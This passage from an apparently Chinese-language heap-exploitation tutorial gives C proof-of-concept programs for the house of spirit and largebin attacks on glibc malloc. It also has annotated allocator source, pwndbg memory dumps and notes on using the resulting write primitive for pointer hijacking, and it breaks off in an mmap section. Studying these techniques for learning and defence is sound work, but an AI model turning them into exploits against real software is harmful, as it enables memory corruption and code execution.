<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This file demonstrates the house of spirit attack.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This attack adds a non-heap pointer into fastbin, thus leading to (nearly) arbitrary write.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Required primitives: known target address, ability to set up the start/end of the target memory&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep 1: Allocate 7 chunks and free them to fill up tcache&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *chunks[<span class="number">7</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">		chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">free</span>(chunks[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep 2: Prepare the fake chunk&quot;</span>);</span><br><span class="line">	<span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line">	<span class="type">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">0x10</span>)));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The target fake chunk is at %p\n&quot;</span>, fake_chunks);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now set the size of the chunk (%p) to 0x40 so malloc will think it is a valid chunk.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Set the size of the chunk (%p) to 0x1234 so freeing the first chunk can succeed.\n&quot;</span>, &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line">	fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep 3: Free the first fake chunk&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Note that the address of the fake chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *victim = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line">	<span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep 4: Take out the fake chunk&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the next calloc will return our fake chunk at %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc can do the trick as well, you just need to do it for 8 times.&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *allocated = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p, fake chunk: %p\n&quot;</span>, allocated, victim);</span><br><span class="line"></span><br><span class="line">	assert(allocated == victim);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-8"><a href="#漏洞成因-8" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出写</p>
<h3 id="适用范围-8"><a href="#适用范围-8" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理-8"><a href="#利用原理-8" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用堆溢出，修改 <code>chunk size</code>，伪造出 <code>fake chunk</code>，然后通过堆的释放和排布，控制 <code>fake chunk</code>。<code>house of spirit</code> 的操作思路有很多，比如可以按如下操作进行利用：</p>
<ul>
<li>申请 <code>chunk A、chunk B、chunk C、chunk D</code></li>
<li>对 <code>A</code> 写操作的时候溢出，修改 <code>B</code> 的 <code>size</code> 域，使其能包括 <code>chunk C</code></li>
<li>释放 <code>B</code>，然后把 <code>B</code> 申请回来，再释放 <code>C</code>，则可以通过读写 <code>B</code> 来控制 <code>C</code> 的内容</li>
</ul>
<h3 id="相关技巧-8"><a href="#相关技巧-8" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>起初 <code>house of spirit</code> 主要是针对 <code>fastbin</code>，后来引入了 <code>tcachebin</code> 后，也可以使用 <code>tcachebin</code> 版本的 <code>house of spirit</code>。利用方法与 <code>fastbin</code> 场景下类似，注意好不同版本下的检查条件即可。</p>
<h3 id="利用效果-8"><a href="#利用效果-8" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>劫持 <code>fastbin/tcachebin</code> 的 <code>fd</code> 之后，可以任意地址分配、任意地址读写</li>
</ul>
<h2 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin_attack"></a>largebin_attack</h2><p>效果：对任意地址写入一个堆地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet (有关代码片段):</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span><br><span class="line"><span class="comment">		fwd = bck;</span></span><br><span class="line"><span class="comment">		bck = bck-&gt;bk;</span></span><br><span class="line"><span class="comment">		victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span><br><span class="line"><span class="comment">		victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">		fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc2.30, two new checks have been enforced(zhi&#x27;x) on large bin chunk insertion\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This prevents the traditional large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And another chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="type">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd_nextsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In our case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="type">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="type">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  assert((<span class="type">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>新版largebin_attack利用的源代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">		      &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line">					  <span class="comment">//将victim链入nextsize链表</span></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;<span class="comment">//设置 victim 的 fd_nextsize，为p2 headptr</span></span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      <span class="comment">//设置 victim 的bk_nextsize，为p2 headptr</span></span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                      <span class="comment">//设置 p1 的fd_nextsize 和 bk_nextsize</span></span><br><span class="line">					  <span class="comment">/*引用到原代码中，示例如下：*/</span></span><br><span class="line">                      &amp;p2-&gt;fd_nextsize = &amp;p1-&gt;fd;</span><br><span class="line">                      &amp;p2-&gt;bk_nextsize = &amp;p1-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      &amp;p1-&gt;fd-&gt;bk_nextsize = &amp;p2-&gt;bk_nextsize-&gt;fd_nextsize = &amp;p2;</span><br></pre></td></tr></table></figure>


<p>首先是程序申请了4个堆块分别为0x428、0x18、0x418、0x18</p>
<p>申请的g1和g2是为了防止两个比较大的堆块合并.</p>
<p>再往后释放了p1堆块，到unsorted bin中</p>
<p>之后有分配了一个比p1大的堆块使得p1堆块能够进入largebin中</p>
<p>改 p1-&gt;bk_nextsize 为target-0x20</p>
<p>然后程序free p2堆块进入到unsorted bin中</p>
<p><strong>此时就造成了unsortedbin中有一个largebinchunk，再次分配一个比bins中都大的chunk时p2会被放入largebin，触发漏洞</strong><br><strong>调试：</strong></p>
<p><code>&amp;target = 0x7fffffffe470</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x555555559290 —▸ 0x7ffff7fbbfd0 (main_arena+1104) ◂— 0x555555559290</span><br><span class="line">pwndbg&gt; x/10gx 0x5555555596e0 <span class="comment"># p2</span></span><br><span class="line">0x5555555596e0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x5555555596f0: 0x00007ffff7fbbbe0      0x00007ffff7fbbbe0</span><br><span class="line">0x555555559700: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559710: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559720: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x555555559290 <span class="comment"># p1</span></span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000431</span><br><span class="line">0x5555555592a0: 0x00007ffff7fbbfd0      0x00007ffff7fbbfd0</span><br><span class="line">0x5555555592b0: 0x0000555555559290      0x00007fffffffe450</span><br><span class="line">0x5555555592c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>执行过victim-&gt;fd_nextsize &#x3D; fwd-&gt;fd;后 p2</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x5555555596e0</span><br><span class="line">0x5555555596e0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x5555555596f0: 0x00007ffff7fbbbe0      0x00007ffff7fbbbe0</span><br><span class="line">0x555555559700: 0x0000555555559290      0x0000000000000000</span><br><span class="line">0x555555559710: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>执行过victim-&gt;bk_nextsize &#x3D; fwd-&gt;fd-&gt;bk_nextsize;后 p2</p>
<blockquote>
<p>这里可以注意到：fwd-&gt;fd 是 0x0000555555559290，即fwd是p1的mem指针，victim是p2的head指针</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x5555555596e0</span><br><span class="line">0x5555555596e0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x5555555596f0: 0x00007ffff7fbbbe0      0x00007ffff7fbbbe0</span><br><span class="line">0x555555559700: 0x0000555555559290      0x00007fffffffe450</span><br><span class="line">0x555555559710: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>执行过&amp;p1-&gt;fd-&gt;bk_nextsize &#x3D; &amp;p2-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; &p2;后target就被写入了 p2 的地址</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x5555555596e0</span><br><span class="line">0x5555555596e0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x5555555596f0: 0x00007ffff7fbbbe0      0x00007ffff7fbbbe0</span><br><span class="line">0x555555559700: 0x0000555555559290      0x00007fffffffe450</span><br><span class="line">0x555555559710: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559720: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x555555559290</span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000431</span><br><span class="line">0x5555555592a0: 0x00007ffff7fbbfd0      0x00007ffff7fbbfd0</span><br><span class="line">0x5555555592b0: 0x0000555555559290      0x00005555555596e0</span><br><span class="line">0x5555555592c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x7fffffffe470-0x20</span><br><span class="line">0x7fffffffe450: 0x0000555555555610      0x00007fffffffe4b0</span><br><span class="line">0x7fffffffe460: 0x0000555555555140      0x00005555555554e7</span><br><span class="line">0x7fffffffe470: 0x00005555555596e0&lt;--target     0x00005555555592a0</span><br><span class="line">0x7fffffffe480: 0x00005555555596d0      0x00005555555596f0</span><br><span class="line">0x7fffffffe490: 0x0000555555559b10      0x0000555555559b30</span><br></pre></td></tr></table></figure>

<p>其实，这三行置零最重要的是最后一行的<code>(target-0x20)-&gt;fd_nextsize = victim</code>这就相当于在(target-0x20)+0x20也就是target的地方写下victim也就是p2的地址</p>
<p><strong>利用：</strong></p>
<p>这种写大数的行为，我们可以用来修改global_max_fast,来使程序中分配的堆块都被识别成fastbin，这样来进行一些可以实现的fastbin attack。再恶劣一点的环境来说，我们可以利用其来进行指针的劫持，劫持为我们可控的地方，在可控的地方为造出原本应有的结构体产生劫持程序流的效果（iofile_attack:你直接说我名字得了）。</p>
<h3 id="漏洞成因-9"><a href="#漏洞成因-9" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="适用范围-9"><a href="#适用范围-9" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理-9"><a href="#利用原理-9" class="headerlink" title="利用原理"></a>利用原理</h3><h3 id="相关技巧-9"><a href="#相关技巧-9" class="headerlink" title="相关技巧"></a>相关技巧</h3><h3 id="利用效果-9"><a href="#利用效果-9" class="headerlink" title="利用效果"></a>利用效果</h3><h2 id="mmap-overlapping-chunks"><a href="#mmap-overlapping-chunks" class="headerlink" title="mmap_overlapping_chunks"></a>mmap_overlapping_chunks</h2><p>malloc的内存通过vmmap可以查看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 